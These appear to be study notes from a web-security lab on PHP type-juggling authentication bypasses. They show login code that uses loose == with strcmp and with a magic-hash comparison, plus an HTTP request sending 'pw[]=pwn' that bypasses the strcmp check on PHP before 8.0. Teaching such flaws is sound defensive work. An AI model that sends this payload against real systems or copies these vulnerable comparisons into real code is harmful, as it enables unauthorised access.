# Authentication Bypass

### **Strcmp Bypass**

- The function [strcmp](https://www.php.net/manual/en/function.strcmp.php) returns `0` if the two compared strings are equal
- If we supply a variable of the data type `array`, the function `strcmp` returns `null`, resulting in the comparison `null == 0`, which is `true` after type juggling

```php
$admin_pw = "P@ssw0rd!";

if(isset($_POST['pw'])){
    if(strcmp($_POST['pw'], $admin_pw) == 0){
        // successfully authenticated
        <SNIP>
    } else {
        // invalid credentials
        <SNIP>
    }
}
```

```python
POST / HTTP/1.1
Host: typejuggling.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

pw[]=pwn
```

<aside>
💡

Note: The behavior of `strcmp` was changed in PHP 8.0.0 to throw an error if any argument is not a string. Thus, the bypass only works in PHP versions prior to 8.0.0.

</aside>

### **Magic Hashes**

```php
$hashed_password = '0e66298694359207596086558843543959518835691168370379069085301337';

if(isset($_POST['pw']) and is_string($_POST['pw'])){
    if(hash('sha256', $_POST['pw']) == $hashed_password){
        // successfully authenticated
        <SNIP>
    } else {
        // invalid credentials
        <SNIP>
    }
}
```